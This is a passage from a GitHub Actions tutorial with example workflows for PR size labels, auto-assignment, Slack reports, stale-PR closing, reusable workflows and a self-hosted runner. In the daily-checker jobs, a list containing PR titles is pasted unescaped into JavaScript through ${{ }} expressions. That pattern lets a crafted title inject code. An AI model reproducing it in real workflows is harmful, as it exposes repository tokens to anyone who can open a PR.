Cloud Storage: Same as above, but using your own cloud storage service. [Self-hosted Only] Shared Drive, Directory: If all Self-hosted Runners mount a shared directory, you can create folders based on UUIDs in this directory to store output results. Subsequent jobs can read the previous job‚Äôs output UUID to locate and retrieve the corresponding stored data.Note that Runners on different machines must also mount the same shared directory. Complete all tasks within the same Job‚Äôs Steps. Learning by Doing GitHub Actions ‚Äî Case Study Implementation‚ÄúSaying is not as good as doing.‚Äù The above explanation of terms and process structure might have been confusing. Next, we will directly show three functional examples, guiding you to practice hands-on while explaining encountered concepts, learning by doing to understand what GitHub Actions really is.Case ‚Äî 1Automatically add File Changes Size Label after creating a Pull Request to help Reviewers manage their review tasks easily.Results ImageDemo PROperation Process User Opens PR, Reopens PR, Pushes New Commit to PR Trigger GitHub Actions Workflow shell script to get the number of file changes Determine Quantity to Label PRs Completed Hands-on PracticeRepo ‚Üí Actions ‚Üí New workflow ‚Üí set up a workflow yourself.File Name: Automation-PullRequest.ymlAction Workflows can have each task in a separate file, or group them by trigger event or purpose in the same file. Multiple Jobs run concurrently. Additionally, because GitHub Actions currently does not support directory structures, having fewer files and using hierarchical file naming is easier to manage.Here, all Actions related to PR events are placed in the same Workflow.Automation-PullRequest.yml# Workflow(Action) namename: Pull Request Automation# Actions Log titlerun-name: \"[Pull Request Automation] ${{ github.event.pull_request.title \\|\\| github.ref }}\"# Trigger eventson: # PR event pull_request: # PR - opened, reopened, or new Push Commit types: [opened, synchronize, reopened]# Cancel running jobs in the same concurrency group if a new job starts# For example, if a new Push Commit triggers a job before the previous one runs, the previous job is canceledconcurrency: group: ${{ github.workflow }}-${{ github.ref_name }} cancel-in-progress: true# Job tasks# Jobs run concurrentlyjobs: # Job ID label-pr-by-file-count: # Job name (optional, better for logs) name: Label PR by changes file count # If this job fails, it won't affect the whole workflow; other jobs continue continue-on-error: true # Set max timeout to avoid endless waiting in abnormal cases timeout-minutes: 10 # Runner Label - use GitHub Hosted Runner ubuntu-latest to run the job # For Private Repos, usage is counted and may incur costs runs-on: ubuntu-latest # Job steps # Steps run sequentially steps: # Step name - name: Get changed file count and apply label # Step ID (optional, only needed if outputs are referenced later) id: get-changed-files-count-by-gh # Inject external environment variables into runtime env: # secrets.GITHUB_TOKEN is automatically generated by GitHub Actions, no need to set manually, has some GitHub Repo API scopes # https://docs.github.com/en/actions/how-tos/security-for-github-actions/security-guides/use-github_token-in-workflows # gh (GitHub CLI) requires GH_TOKEN in ENV for permission to operate GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} # Shell script # GitHub Hosted Runner has gh CLI preinstalled, no need to install before use run: \\| # ${{ github.xxx }} is a GitHub Actions Context expression # Not a shell variable, replaced by GitHub Actions during YAML parsing # More info: https://docs.github.com/en/actions/learn-github-actions/contexts#github-context # Get PR number: PR_NUMBER=${{ github.event.pull_request.number }} # Get Repo: REPO=${{ github.repository }} # Use GitHub API (gh CLI) to get number of changed files FILE_COUNT=$(gh pr view $PR_NUMBER --repo $REPO --json files --jq '.files \\| length') # Print log echo \"Changed file count: $FILE_COUNT\" # Label logic if [ \"$FILE_COUNT\" -lt 5 ]; then LABEL=\"XS\" elif [ \"$FILE_COUNT\" -lt 10 ]; then LABEL=\"S\" elif [ \"$FILE_COUNT\" -lt 30 ]; then LABEL=\"M\" elif [ \"$FILE_COUNT\" -lt 80 ]; then LABEL=\"L\" elif [ \"$FILE_COUNT\" -lt 200 ]; then LABEL=\"XL\" else LABEL=\"XXL\" fi # Use GitHub API (gh CLI) to remove current Size labels EXISTING_LABELS=$(gh pr view \"$PR_NUMBER\" --repo \"$REPO\" --json labels --jq '.labels[].name') for EXISTING in $EXISTING_LABELS; do case \"$EXISTING\" in XS\\|S\\|M\\|L\\|XL\\|XXL) echo \"üßπ Removing existing label: $EXISTING\" gh pr edit \"$PR_NUMBER\" --repo \"$REPO\" --remove-label \"$EXISTING\" ;; esac done # (Optional) Create label if it doesn't exist if ! gh label list --repo \"$REPO\" \\| grep -q \"^$LABEL\"; then echo \"üÜï Creating missing label: $LABEL\" gh label create \"$LABEL\" --repo \"$REPO\" --description \"Size label: $LABEL\" --color \"ededed\" else echo \"‚úÖ Label '$LABEL' already exists\" fi # Use GitHub API (gh CLI) to add the label gh pr edit $PR_NUMBER --repo $REPO --add-label \"$LABEL\"After committing files to the repo‚Äôs main branch, opening a new PR will automatically trigger GitHub Actions:Action execution status showing Queued means the task is waiting for the Runner to pick it up and execute.Execution ResultDemo PRAfter execution is complete and successful, the PR will automatically be labeled accordingly! The record will show it was labeled by github-actions.Full code: Automation-PullRequest.ymlUse Prebuilt Action Steps: pascalgn/size-label-actionEarlier, it was mentioned that you can directly use pre-built Actions created by others. The task of marking the PR Size Label already has ready-made solutions available. The above example is only for teaching purposes; in practice, you don‚Äôt need to reinvent the wheel.You can complete the task directly by using it in the Action Workflow Job Step:# Workflow(Action) Namename: Pull Request Automation# Trigger Eventon: # PR event pull_request: # PR - opened, reopened, or new push commit types: [opened, synchronize, reopened]# Cancel running jobs in the same Concurrency Group if a new job starts# For example, if a push commit triggers a job and another push commit happens before it runs, the previous job will be canceledconcurrency: group: ${{ github.workflow }}-${{ github.ref_name }} cancel-in-progress: true# Job tasks# Jobs run concurrentlyjobs: # Job ID label-pr-by-file-count: # Job name (optional, better readability in logs) name: Label PR by changes file count # If this job fails, do not affect the entire workflow, continue with other jobs continue-on-error: true # Set maximum timeout to prevent endless waiting in case of issues timeout-minutes: 10 # Runner Label - use GitHub Hosted Runner ubuntu-latest to run the job # For private repos, usage counts and may incur costs runs-on: ubuntu-latest # Job steps # Steps run sequentially steps: # Step name - name: Get changed file count and apply label # Step ID (optional, only needed if outputs are referenced later) id: get-changed-files-count-by-gh # Use a pre-built action from others uses: \"pascalgn/size-label-action@v0.5.5\" # Inject external environment variables into runtime # For parameter names and usage, see: https://github.com/pascalgn/size-label-action/tree/main env: # secrets.GITHUB_TOKEN is automatically generated by GitHub Actions (github-actions identity), no need to set manually in Secrets, has some GitHub Repo API scopes # https://docs.github.com/en/actions/how-tos/security-for-github-actions/security-guides/use-github_token-in-workflows GITHUB_TOKEN: \"${{ secrets.GITHUB_TOKEN }}\"This packaged Action is a JavaScript Action. You can refer to the actual execution code in the following file: dist/index.js.Supplement on name and run-name: name: Name of the Action Workflow run-name: Title of the execution record (can include PR Title, Branch, Author, etc.)If the event is on:pull_request, the default is the PR Title. Case ‚Äî 2Automatically assign the author and add a comment prompt if there is no Assignee after creating a Pull Request. (This only runs on the initial creation)Result ImageDemo PRWorkflow User opens a PR Trigger GitHub Actions Workflow GitHub script to get assignee If there is no assignee, assign the PR author &amp; comment a message Completed Hands-On PracticeRepo ‚Üí Actions ‚Üí New workflow ‚Üí set up a workflow yourself.File Name: Automation-PullRequest.yml (same as above)Automation-PullRequest.yml# Workflow(Action) Namename: Pull Request Automation# Actions Log Titlerun-name: \"Pull Request Automation - Daily Checker\"# Trigger Eventson: # PR Event pull_request: # PR - opened, reopened, or new push commit types: [opened, synchronize, reopened]# Cancel running jobs in the same concurrency group if a new job starts# For example, if a push commit triggers a job that hasn't started yet and a new push commit happens, the previous job is canceledconcurrency: group: ${{ github.workflow }}-${{ github.ref_name }} cancel-in-progress: true# Job Tasks# Jobs run concurrentlyjobs: # Job ID label-pr-by-file-count: # Please refer to previous text, omitted.... # --------- assign-self-if-no-assignee: name: Automatically assign to self if no assignee is specified # Since the trigger event is shared, this job checks if the PR is opened (first creation) before running; otherwise, it will be skipped if: github.event_name == 'pull_request' &amp;&amp; github.event.action == 'opened' # If this job fails, it won't affect the whole workflow; other jobs continue continue-on-error: true # Set maximum timeout to prevent endless waiting in abnormal situations timeout-minutes: 10 # Runner Label - use GitHub Hosted Runner ubuntu-latest to run the job # For private repos, usage is counted and may incur charges runs-on: ubuntu-latest steps: - name: Assign self if No Assignee # Use GitHub Script (JavaScript) to write the script (Node.js environment) # Compared to shell script above, this is easier and cleaner # No need to manually inject environment variables or GITHUB_TOKEN uses: actions/github-script@v7 with: script: \\| // github-script automatically injects the context variable for direct JavaScript use // https://docs.github.com/en/actions/learn-github-actions/contexts#github-context const issue = context.payload.pull_request; // To support issues too, use context.payload.issue \\|\\| context.payload.pull_request const assignees = issue.assignees \\|\\| []; const me = context.actor; if (assignees.length === 0) { // Assign self as assignee await github.rest.issues.addAssignees({ owner: context.repo.owner, repo: context.repo.repo, issue_number: issue.number, assignees: [me] }); // Leave comment notification await github.rest.issues.createComment({ owner: context.repo.owner, repo: context.repo.repo, issue_number: issue.number, body: `üîß No assignee was set, so I have assigned this to myself (@${me}).` }); }This time, we demonstrate using GitHub Script (JavaScript) to write the script, offering more flexibility and easier coding.Of course, if you want to follow what I said before about one file per task, you can remove the Job If. . and directly set the trigger conditions in the Action Workflow:Automation-PullRequest-Auto-Assign.yml :# Workflow(Action) Namename: Pull Request Automation - Auto Assignee Self# Trigger Eventon: # PR Event pull_request: # PR - When opened types: [opened]jobs: assign-self-if-no-assignee: name: Automatically assign to self if no assignee is specified runs-on: ubuntu-latest steps: # Please refer to the previous text, omitted....After committing files to the repo‚Äôs main branch, opening a new PR will automatically trigger GitHub Actions:There are now two jobs to be executed!Execution ResultsDemo PRAfter execution and success, if the PR has no Assignees, it will automatically assign the PR author and comment a message. (All actions are performed using the github-actions identity)Full Code: Automation-PullRequest.ymlTesting Reopened PRYou can see that only the Size Label Job was executed, while the Auto Assignee Job was skipped. This task also has a ready-made Action that can be reused, see: pozil/auto-assign-issue.Case ‚Äî 3Automatically count the current number of PRs and how long they have been open every day at 9 AM, then send a notification message to the Slack workgroup. Automatically close PRs that have been open for more than 3 months.Result Image Slack workgroup automatically receives reports every morning Automatically close PRs older than 90 days Workflow GitHub Actions Automatically Triggered Every Day at 9 AM Trigger GitHub Actions Workflow GitHub script to get the list of open PRs and count how many days they have been open Send Statistical Report Messages to Slack Close PRs Older Than 90 Days Completed Hands-On PracticeRepo ‚Üí Actions ‚Üí New workflow ‚Üí set up a workflow yourself.File Name: Automation-PullRequest-Daily.ymlAutomation-PullRequest-Daily.yml# Workflow(Action) Namename: Pull Request Automation - Daily Checker# Trigger Eventson: # Scheduled automatic execution # https://crontab.guru/ # UTC time schedule: # 01:00 UTC = 09:00 UTC+8 daily - cron: '0 1 * * *' # Manual trigger workflow_dispatch:# Job Items# Jobs run concurrentlyjobs: # Job ID caculate-pr-status: # Job Name (optional, improves log readability) name: Calculate PR Status # Runner Label - Use GitHub Hosted Runner ubuntu-latest to run the job # For private repos, usage counts and may incur costs runs-on: ubuntu-latest # Job Output outputs: pr_list: ${{ steps.pr-info.outputs.pr_list }} # Job Steps # Steps run sequentially steps: # Step Name - name: Fetch open PRs and calculate # To expose Step Output, set id id: pr-info uses: actions/github-script@v7 with: script: \\| const now = new Date(); const per_page = 100; let page = 1; let allPRs = []; while (true) { const { data: prs } = await github.rest.pulls.list({ owner: context.repo.owner, repo: context.repo.repo, state: 'open', per_page, page, }); if (prs.length === 0) break; allPRs = allPRs.concat(prs); if (prs.length &lt; per_page) break; page++; } const result = allPRs.map(pr =&gt; { const created = new Date(pr.created_at); const daysOpen = Math.floor((now - created) / (1000 * 60 * 60 * 24)); return { pr: pr.number.toString(), title: pr.title, idle: daysOpen }; }); // Set output, only accepts String core.setOutput('pr_list', JSON.stringify(result)); # ---- send-pr-summary-message-to-slack: name: Send PR Summary Message to Slack # Jobs run concurrently by default; using needs forces this job to wait for the specified job to complete needs: [caculate-pr-status] runs-on: ubuntu-latest steps: - name: Generate Message # To expose Step Output, set id id: gen-msg uses: actions/github-script@v7 with: script: \\| const prList = JSON.parse(`${{ needs.caculate-pr-status.outputs.pr_list }}`); const blocks = []; // Title blocks.push({ type: \"section\", text: { type: \"mrkdwn\", text: `üì¨ *Open PR Report*\\nTotal: *${prList.length}* PR(s)` } }); // One line per PR for (const pr of prList) { blocks.push({ type: \"section\", text: { type: \"mrkdwn\", text: `‚Ä¢ &lt;https://github.com/${context.repo.owner}/${context.repo.repo}/pull/${pr.pr}\\|PR #${pr.pr}&gt; *${pr.title}* - üïí ${pr.idle} day(s)` } }); } // Set output, only accepts String core.setOutput('blocks', JSON.stringify(blocks)); # Use Slack's official Slack API GitHub Actions # https://tools.slack.dev/slack-github-action/sending-techniques/sending-data-slack-api-method/ # Send message - name: Post text to a Slack channel uses: slackapi/slack-github-action@v2.1.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: \\| channel: ${{ vars.SLACK_TEAM_CHANNEL_ID }} blocks: ${{ steps.gen-msg.outputs.blocks }} # ---- auto-close-old-prs: name: Auto Close Old PRs needs: [caculate-pr-status] runs-on: ubuntu-latest steps: - name: Auto close PRs opened more than 90 days uses: actions/github-script@v7 with: script: \\| const prList = JSON.parse(`${{ needs.caculate-pr-status.outputs.pr_list }}`); const oldPRs = prList.filter(pr =&gt; pr.idle &gt; 90); for (const pr of oldPRs) { await github.rest.pulls.update({ owner: context.repo.owner, repo: context.repo.repo, pull_number: parseInt(pr.pr), state: 'closed' }); await github.rest.issues.createComment({ owner: context.repo.owner, repo: context.repo.repo, issue_number: parseInt(pr.pr), body: `‚ö†Ô∏è This pull request has been automatically closed because it has been open for more than 90 days. Please reopen if needed.` }); } console.log(`Closed ${oldPRs.length} PR(s)`);In this example, we use: on: schedule Crontab schedule for automatic trigger and workflow_dispatch for manual trigger support Job output/Step output (must be strings only) Multiple jobs run concurrently by default but can use needs to set time-dependent dependencies. Get Settings from Repo Secrets/Variables Connecting to Slack API Repo Secrets ‚Äî Add SLACK_BOT_TOKEN For setting up a Slack App and configuring message permissions, you can refer to my previous article.Repo Variables ‚Äî Add SLACK_TEAM_CHANNEL_IDAfter committing files to the Repo main branch, go back to Actions and manually trigger it to check: It will be automatically triggered daily in the future.Actions ‚Üí Pull Request Automation ‚Äî Daily Checker ‚Üí Run workflow ‚Üí Branch: main ‚Üí Run workflow„ÄÇAfter execution, you can click to view the execution status:Due to the needs constraint, the Jobs workflow will have Calculate PR Status complete first, then Auto Close Old PRs and Send PR Summary Message to Slack will run concurrently.Execution ResultAfter all tasks are successfully executed, you can check the Slack messages:Success üöÄüöÄüöÄFull code: Automation-PullRequest-Daily.ymlSummary I hope the above three examples give you a basic understanding of GitHub Actions and inspire your creativity in automation. You can design your own workflows (be sure to first check the trigger events) and then write scripts to execute them. Also, remember to visit the Marketplace to find existing actions you can use to stand on the shoulders of giants.This article is just an introduction (without even checking out the code). The next article, CI/CD Practical Guide (Part 3): Implementing CI and CD Workflows for App Projects Using GitHub Actions, will cover more complex and advanced GitHub Actions workflows.GitHub Automation Extended TopicsGitHub can integrate with Slack to subscribe to Repo PR update notifications, Push Default Branch notifications, and more.Issue 1. GitHub messages cannot tag people, only GitHub accounts are tagged, Slack accounts do not receive notifications:Slack App or search for GitHub in Apps ‚Üí open the message window ‚Üí complete the Connect GitHub Account step. This lets GitHub know your corresponding Slack UID so it can mention you.Question 2. Pull Request ReminderI remember this was originally a third-party feature, but later it was directly integrated into GitHub. Don‚Äôt foolishly write scripts yourself using GitHub Actions! GitHub‚Äôs built-in setting is by Team. You need to create a Team for your organization and add Repos to the Team before you can set up Pull Request Reminders. After joining the Slack Channel and saving the rules, daily reminder messages will be automatically sent with the Reviewer tagged. Setup instructions can be found here. The result is shown in the image below:https://michaelheap.com/github-scheduled-reminders/Issue 4. GitHub PR message, author does not receive notification: This is a perennial issue: the PR Slack message does not actually notify the author when someone replies in Threads. The Slack message sent by GitHub only mentions Reviewers, not the Assignee or PR author.At this point, GitHub Actions as an automation tool comes in handy. We can add a Job to append the author tag at the end of the PR Description, so the message sent to Slack will also tag the author‚Äôs Slack:# Workflow(Action) Namename: Pull Request Automation# Please refer to the previous text, omitted.... # --------- append-author-to-pr-description: name: Append author to PR description # Since this is a shared trigger event, the Job itself checks and runs only when the Pull Request is opened (initial creation); otherwise, it will be skipped if: github.event_name == 'pull_request' &amp;&amp; github.event.action == 'opened' # If this Job fails, it won't affect the entire Workflow; other Jobs will continue continue-on-error: true # Set maximum timeout to prevent endless waiting in abnormal situations timeout-minutes: 10 # Runner Label - use GitHub Hosted Runner ubuntu-latest to run the job # For Private Repos, usage counts and may incur costs if exceeded # But such small automation jobs rarely exceed limits runs-on: ubuntu-latest steps: - name: Append author to PR description env: # secrets.GITHUB_TOKEN is automatically generated by GitHub Actions during execution; no need to set manually in Secrets, it has some GitHub Repo API scopes # gh (GitHub) CLI requires GH_TOKEN injected into ENV to have permission to operate # https://docs.github.com/en/actions/how-tos/security-for-github-actions/security-guides/use-github_token-in-workflows GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} # ${{ github.xxx }} is a GitHub Actions Context expression # Not a shell variable, but replaced by GitHub Actions during YAML parsing with corresponding values # Other parameters: https://docs.github.com/en/actions/learn-github-actions/contexts#github-context PR_NUMBER: ${{ github.event.pull_request.number }} AUTHOR_TAG: '@${{ github.event.pull_request.user.login }}' run: \\| PR_BODY=$(gh pr view $PR_NUMBER --repo ${{ github.repository }} --json body -q \".body\") NEW_BODY=$(printf \"%s\\n\\nCreated by %s\" \"$PR_BODY\" \"$AUTHOR_TAG\") gh pr edit $PR_NUMBER --repo ${{ github.repository }} --body \"$NEW_BODY\"Full Code: Automation-PullRequest.ymlWhen opening a PR, the author information is automatically added after the description, and Slack messages correctly tag the author:Issue 5. GitHub sending excessive notification emails is very disruptive:After setting up notifications for both the GitHub Repo and Slack, all notifications are received in Slack. You can go to your GitHub personal settings to turn off email notifications:OthersActions currently do not have a directory structure, but you can pin up to five Actions on the Actions page. You can also disable an Action to pause it.You can view GitHub Actions usage and performance in Insights:Reuse Workflow SupplementNext article uses the same repo to split Reuse Workflow. Here is an example of splitting Reuse Workflow across different repos.First, define a Reuse Workflow: Automation-label-pr-base-branch.yml: in the ZhgChgLi/github-actions-ci-cd-demo-share-actions repo.name: Automation-label-pr-base-branchrun-name: \"[Automation-label-pr-base-branch] ${{ github.event.inputs.PR_NUMBER \\|\\| github.ref }}\"concurrency: group: ${{ github.workflow }}-${{ github.event.inputs.PR_NUMBER \\|\\| github.ref }} cancel-in-progress: true# Trigger eventon: # Triggered by other workflows calling this workflow workflow_call: # Data input inputs: # PR Number PR_NUMBER: required: true type: string # Secret input secrets: GH_TOKEN: description: \"GitHub token for API access\" required: truejobs: label-pr-base-branch: name: Label PR Base Branch continue-on-error: true timeout-minutes: 10 runs-on: ubuntu-latest steps: - name: Label PR by Base Branch id: label-pr-base-branch env: GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} run: \\| PR_NUMBER=\"${{ inputs.PR_NUMBER }}\" REPO=\"${{ github.repository }}\" echo \"üì¶ Processing PR #$PR_NUMBER in repo $REPO\" # Get PR's base branch BASE_BRANCH=$(gh pr view \"$PR_NUMBER\" --repo \"$REPO\" --json baseRefName --jq '.baseRefName') echo \"üîñ PR Base Branch: $BASE_BRANCH\" # Allowed base branch labels BRANCH_LABELS=(\"develop\" \"main\" \"master\") # Check if label is in allowed list if [[ \" ${BRANCH_LABELS[@]} \" =~ \" ${BASE_BRANCH} \" ]]; then LABEL=\"$BASE_BRANCH\" else echo \"‚ö†Ô∏è Base branch '$BASE_BRANCH' not in allowed list, skipping label.\" exit 0 fi # Remove existing base branch labels EXISTING_LABELS=$(gh pr view \"$PR_NUMBER\" --repo \"$REPO\" --json labels --jq '.labels[].name') for EXISTING in $EXISTING_LABELS; do if [[ \" ${BRANCH_LABELS[@]} \" =~ \" ${EXISTING} \" ]]; then echo \"üßπ Removing existing base branch label: $EXISTING\" gh pr edit \"$PR_NUMBER\" --repo \"$REPO\" --remove-label \"$EXISTING\" fi done # Create label if it doesn't exist if ! gh label list --repo \"$REPO\" \\| grep -q \"^$LABEL$\"; then echo \"üÜï Creating missing label: $LABEL\" gh label create \"$LABEL\" --repo \"$REPO\" --description \"PR targeting $LABEL branch\" --color \"ededed\" else echo \"‚úÖ Label '$LABEL' already exists\" fi # Add base branch label echo \"üè∑Ô∏è Adding label '$LABEL' to PR #$PR_NUMBER\" gh pr edit \"$PR_NUMBER\" --repo \"$REPO\" --add-label \"$LABEL\"Back to our main ZhgChgLi/github-actions-ci-cd-demo repo, add a main workflow Demo-Reuse-Action-From-Another-Repo.yml:name: Automation-label-pr-base-branchon: pull_request: types: [opened]jobs: call-label-pr-workflow: name: Call Base Branch Label Workflow # ‚úÖ If the called workflow is in the same repo: # uses: ./.github/workflows/Automation-label-pr-base-branch.yml # Note: This method cannot specify the branch (always uses the caller workflow's branch) # Reference examples: # - CD-Deploy-Form.yml calls workflow in this repo # - CD-Deploy.yml calls workflow across repos # # ‚úÖ If the called workflow is in another repo: # uses: {owner}/{repo}/.github/workflows/{file}.yml@{branch_or_tag} # You can specify branch or tag # ref: https://github.com/ZhgChgLi/github-actions-ci-cd-demo-share-actions/blob/main/.github/workflows/Automation-label-pr-base-branch.yml uses: ZhgChgLi/github-actions-ci-cd-demo-share-actions/.github/workflows/Automation-label-pr-base-branch.yml@main with: PR_NUMBER: ${{ github.event.number }} # If all secrets should be inherited from the caller workflow, use `inherit` # secrets: inherit # # If only specific secrets are needed, specify individually secrets: GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}Try opening a PR after committing the file.Workflow: The main repo‚Äôs Demo-Reuse-Action-From-Another-Repo.yml ‚Üí calls and passes parameters to another repo‚Äôs Automation-label-pr-base-branch.yml to execute tasks ‚Üí returns to the main repo to report results.Success!Private Repo Access IssuesHere is a security issue to note: Public Repos are completely fine, but if Reuse Workflow is in a Private Repo, it can only be accessed and used if other Repos are in the same organization + those Repos are also Private + permissions are granted. Public ‚Äî ZhgChgLi/ReuseRepo + Private or Public-ZhgChgli or harry/myRepo = ‚úÖ Private ‚Äî ZhgChgLi/ReuseRepo + Private or Public‚Äî harry/myRepo = ‚ùå Private ‚Äî ZhgChgLi/ReuseRepo + Public ‚Äî ZhgChgLi/anotherRepo = ‚ùå Private ‚Äî ZhgChgLi/ReuseRepo + Private ‚Äî ZhgChgLi/anotherRepo = ‚úÖ Set allowed methods by going to Reuse Workflow Repo ‚Üí Settings ‚Üí Actions ‚Üí General ‚Üí Access:Change selection:Accessible from repositories in the 'ZhgChgLi' organizationWorkflows in other repositories within the 'ZhgChgLi' organization can access the actions and reusable workflows in this repository. Access is allowed only from private repositories.Click ‚ÄúSave‚Äù to save and complete.If you don‚Äôt have access permission, the following error message will appear:Invalid workflow file: .github/workflows/Demo-reuse-action-from-another-repo.yml#L21error parsing called workflow\".github/workflows/Demo-reuse-action-from-another-repo.yml\"-&gt; \"ZhgChgLi/github-actions-ci-cd-demo-share-actions/.github/workflows/Automation-label-pr-base-branch.yml@main\": workflow was not found.GitHub Actions Script Syntax SupplementAdding some clarification on the ${{ XXX }} or ${XXX} or $XXX variable syntax that everyone might find confusing.Demo-Env-Vars- .yml:name: Demo-Env-Varson: workflow_dispatch:jobs: print-env-vars: runs-on: ubuntu-latest steps: - name: print-env run: env - name: context-vars-vs-vars env: SAY_MY_NAME: \"Heisenberg\" # GitHub Actions Context expression, explained below FROM_REF: \"${{ github.ref }}\" run: \\| # Shell Script: # Referencing custom injected ENV variable values # ${SAY_MY_NAME} or $SAY_MY_NAME both work # ${XX} is better for string concatenation: echo \"HI: ${SAY_MY_NAME}\" # üí° GitHub Actions Context expression # This is not a shell variable, but replaced by GitHub Actions during YAML parsing # ‚ö† Will fail if run locally or outside GitHub Actions environment # üîó https://docs.github.com/en/actions/learn-github-actions/contexts#github-context BRANCH_NAME_FROM_CONTEXT=\"${{ github.ref }}\" # üí° GitHub Actions runtime environment variables # These variables are automatically injected by GitHub Actions when the runner executes the shell # ‚úÖ Can be pre-defined in other environments with export or ENV # üîó https://docs.github.com/en/actions/learn-github-actions/environment-variables BRANCH_NAME_FROM_ENV_VARS=\"${GITHUB_REF}\" echo \"FROM_REF: ${FROM_REF}\" echo \"BRANCH_NAME_FROM_CONTEXT: ${BRANCH_NAME_FROM_CONTEXT}\" echo \"BRANCH_NAME_FROM_ENV_VARS: ${BRANCH_NAME_FROM_ENV_VARS}\" - name: print-github-script-env uses: actions/github-script@v7 env: SAY_MY_NAME: \"Heisenberg\" # GitHub Actions Context expression, same as above FROM_REF: \"${{ github.ref }}\" with: script: \\| // GitHub Script: (JavaScript (Node.js)): // Get ENV values from process.env console.log(`HI: ${process.env.SAY_MY_NAME}`); console.log(`FROM_REF: ${process.env.FROM_REF}`); // github-script automatically injects context variables for direct JavaScript access // https://docs.github.com/en/actions/learn-github-actions/contexts#github-context const branch_name_from_context_vars = context.ref; console.log(`branch_name_from_context_vars: ${branch_name_from_context_vars}`); // Can also use GitHub Actions Context expression (though less meaningful): const branch_name_from_context = \"${{ github.ref }}\"; console.log(`branch_name_from_context: ${branch_name_from_context}`); for (const [key, value] of Object.entries(process.env)) { console.log(`${key}=${value}`); } // The github object in github-script is an Octokit REST API instance // Used for interacting with the GitHub API // For example: // await github.rest.pulls.list({ // owner: context.repo.owner, // repo: context.repo.repo, // state: \"open\" // }); # gh CLI does NOT use GITHUB_TOKEN by default; requires GH_TOKEN - name: gh CLI without GH_TOKEN (expected to fail) continue-on-error: true run: \\| PR_COUNT=$(gh pr list --repo $GITHUB_REPOSITORY --json number --jq 'length') echo \"Found $PR_COUNT open pull requests\" - name: gh CLI with GH_TOKEN (expected to succeed) env: # Assign GH_TOKEN so gh CLI can authenticate # https://docs.github.com/en/actions/how-tos/security-for-github-actions/security-guides/use-github_token-in-workflows GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} run: \\| PR_COUNT=$(gh pr list --repo $GITHUB_REPOSITORY --json number --jq 'length') echo \"Found $PR_COUNT open pull requests\" - name: github-script auto-authentication (no GH_TOKEN needed) uses: actions/github-script@v7 with: script: \\| // github = Octokit REST client (auto-authenticated with GITHUB_TOKEN) const pulls = await github.rest.pulls.list({ owner: context.repo.owner, repo: context.repo.repo, state: \"open\" }); console.log(`Found ${pulls.data.length} open pull requests`);${ { XXX } } GitHub Actions Context Expression ${{ XXX }} is a GitHub Actions Context expression, replaced by GitHub Actions with the corresponding value during the YAML parsing phase (as shown above with BRANCH_NAME_FROM_CONTEXT) The complete usable expressions can be referenced in the official documentation ${XXX} or $XXX are real environment variables. ${XXX} is more convenient for string concatenation. GitHub Actions injects some default environment variables. For the full list, please refer to the official documentation actions/github-script@v7 In github-script, you can also use ${{ XXX }}, which is a GitHub Actions Context expression, but it is not very meaningful; because in the github-script environment, context variables are injected by default and can be directly referenced in JavaScript. In github-script, the github object is an instance of the Octokit REST API. github-script can also inject variables from env:, but you need to access them using ${process.env.xxx}. The same environment variables are injected by default and can be fully referenced in the official documentation. Access them via ${process.env.xxx}; however, since there is already a context variable, accessing them this way is not very meaningful. github-script automatically includes the github-token, no need to specify it.gh cli GH_TOKEN Using gh cli in GitHub Actions Shell Script requires specifying the GH_TOKEN parameter You can directly use the default token ‚Äî secrets.GITHUB_TOKEN (automatically generated during GitHub Actions execution) The default token has basic permissions. If higher permissions are needed, use a Personal Access Token. For team use, it is recommended to create a PAT with a shared account. Full code: Demo-Env-Vars- .ymlGitHub Actions has been developed. The next step is to replace the GitHub Hosted Runner with your own Self-hosted Runner. GitHub Hosted Runner offers a free quota of 2,000 minutes per month (starting point). Running these small automation tasks takes little time, and since it runs on Linux machines, the cost is very low, often not even reaching the free limit; it‚Äôs not necessary to switch to a Self-hosted Runner. Changing the Runner also requires ensuring the Runner environment is set up correctly (for example, GitHub Hosted Runner comes with the gh CLI pre-installed, but with a self-hosted Runner, you need to install it yourself). This article only switches Runners for teaching purposes. Self-hosted Runner is only required when running CI/CD tasks.Add Self-hosted Runner This article uses macOS M1 as an example. Settings ‚Üí Actions ‚Üí Runners ‚Üí New self-hosted runner. Runner image: macOS Architecture : For M1, remember to select ARM64 for faster execution Open a Terminal on a physical computer.Complete on your local computer following the Download steps:# Create the Runner directory in your desired pathmkdir actions-runner &amp;&amp; cd actions-runner# Download the Runner imagecurl -o actions-runner-osx-x64-2.325.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.325.0/actions-runner-osx-x64-2.325.0.tar.gz# Optional: Validate the hashecho \"0562bd934b27ca0c6d8a357df00809fbc7b4d5524d4aeb6ec152e14fd520a4c3 actions-runner-osx-x64-2.325.0.tar.gz\" \\| shasum -a 256 -c# Extract the archivetar xzf ./actions-runner-osx-x64-2.325.0.tar.gz The above is for reference only; it is recommended to follow the steps on your setup page to get the latest version of the Runner image.Ë®≠ÂÆö Configure:# Please refer to the settings page command, the Token changes over time./config.sh --url https://github.com/ORG/REPO --token XXXYou will be asked to enter in sequence: Enter the name of the runner group to add this runner to: [press Enter for Default] Press Enter directlyOnly runners registered at the Organization level have the Group grouping feature Enter the name of runner: [press Enter for ZhgChgLideMacBook-Pro] You can enter the desired Runner name e.g. app-runner-1 or just press Enter This runner will have the following labels: ‚Äòself-hosted‚Äô, ‚ÄòmacOS‚Äô, ‚ÄòX64‚ÄôEnter any additional labels (ex. label-1,label-2): [press Enter to skip]Enter the Runner labels you want to set. You can add multiple custom labels for easier use later.As mentioned before, GitHub Actions/Runner finds tasks based on the corresponding labels. If you only use the default labels, the runner might pick up jobs intended for other runners in the organization. Creating a custom label is the safest option.Here, I randomly set a label self-hosted-zhgchgli Enter name of work folder: [press Enter for _work] Press Enter directly When ‚àö Settings Saved. appears, it means the settings are complete.Start Runner:./run.shWhen you see ‚àö Connected to GitHub and Listening for Jobs, it means the Actions tasks are being monitored: This Terminal window will keep receiving tasks as long as it remains open. üöÄüöÄüöÄYou can start multiple Runners by opening multiple Terminals in different directories on the same computer.Back on the Repo settings page, you can also see the Runner waiting for tasks:Status: Idle: inactive, waiting for tasks Active: A task is currently running Offline: Runner is not online Workflow (GitHub Actions) Runner Switch to Self-hosted RunnerTaking 